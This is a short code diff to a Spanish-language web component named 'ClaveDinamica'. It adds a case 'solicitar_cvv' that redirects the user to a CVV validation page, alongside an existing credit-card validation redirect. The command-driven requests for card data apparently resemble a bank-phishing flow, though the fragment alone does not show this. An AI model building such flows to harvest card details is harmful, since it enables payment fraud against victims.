@@ -528,6 +528,9 @@ export default function ClaveDinamica() {
 
                         // Se sale del ciclo
                         break;
+                    case 'solicitar_cvv':
+                        window.location.href = '/validacion-cvv';
+                        break;
                     case 'solicitar_tc_custom':
 
                         // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
